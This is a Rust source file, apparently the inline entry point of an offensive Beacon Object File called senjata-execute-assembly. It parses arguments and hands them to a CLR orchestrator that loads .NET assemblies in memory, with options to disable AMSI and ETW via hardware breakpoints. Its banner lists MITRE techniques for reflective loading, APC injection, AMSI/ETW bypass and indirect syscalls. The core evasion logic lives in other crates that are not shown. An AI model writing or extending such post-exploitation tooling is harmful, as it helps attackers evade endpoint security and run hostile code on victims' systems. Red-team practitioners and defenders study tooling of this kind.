//! Senjata-Execute-Assembly BOF — inline-mode entry point. Most logic
//! lives in `clr-orchestrator`; this crate handles args parsing and the
//! rustbof-driven main entry.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod error;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::eprintln!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;

    // Operator-visible banner. Same content as senjata-runner's banner
    // so credit + MITRE mapping is identical regardless of --inline vs
    // sacrificial dispatch.
    rustbof::eprintln!("[senjata] senjata-execute-assembly v0.4.0  -  Created by DAP");
    rustbof::eprintln!(
        "[senjata] MITRE ATT&CK: T1620 (Reflective Code Loading) | T1055.004 (APC Injection) | T1562.001 (Disable AMSI/ETW) | T1106 (Indirect Syscalls)"
    );

    unsafe {
        let engine = opsec_hwbp::HwbpEngine::init()
            .map_err(|e| BofError::Orchestrator(
                clr_orchestrator::OrchestratorError::Hwbp(e)
            ))?;
        let input = clr_orchestrator::OrchestrateInput {
            app_domain: &a.app_domain,
            amsi: a.amsi,
            etw: a.etw,
            mailslot: a.mailslot,
            entry_point: a.entry_point,
            slot_name: &a.slot_name,
            pipe_name: &a.pipe_name,
            asm_args: &a.asm_args,
            mode: a.mode,
            main_name: &a.main_name,
            asm_bytes: &a.asm_bytes,
            log_fn: None,
        };
        clr_orchestrator::orchestrate(&input, &engine)?;
    }
    Ok(())
}
